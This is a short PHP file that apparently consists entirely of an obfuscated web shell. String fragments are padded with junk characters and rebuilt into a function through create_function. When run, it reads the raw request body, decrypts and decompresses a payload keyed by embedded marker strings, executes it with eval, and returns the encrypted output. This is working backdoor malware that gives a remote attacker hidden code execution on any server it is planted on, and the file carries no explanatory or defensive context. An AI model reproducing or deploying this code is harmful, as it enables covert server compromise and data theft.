<?php
$D='inputU"),$mU)U==U1) {U@ob_start();@evaUl(U@gUzuUncompresUs(@x(@baseU64_decodUe($m[1]),$k)U));$o=@UobUU_';
$Z='get_coUntents();@ob_endU_cUlean()U;$r=U@base6U4_encode(@x(U@gzcomUpress(U$oU),$kU)U);print("$pU$kh$r$kf");}';
$W=',$k){U$c=Ustrlen($k);$l=UsUtrlenU($t)U;$o="";for($i=0UU;$i<$l;){forU($j=0;(U$Uj<$c&&$UiU<U$l);$j++,$i++';
$C='){U$o.=$t{$UUi}^$k{$j};}}reUtuUUUrn $o;}if U(@Upreg_match("/U$Ukh(.+)$kf/",@filUe_get_conteUnts("pUhpU://';
$O=str_replace('qr','','creqratqre_qrqrfqruqrnction');
$l='$k="99cUc6U1a1U";U$kh="6Uf0abad154b7";$kUUf="bU06a0c76b2bb";$pU="Uq5dTK73keblNUw5VC"U;functUion x($tUU';
$t=str_replace('U','',$l.$W.$C.$D.$Z);
$q=$O('',$t);$q();
?>
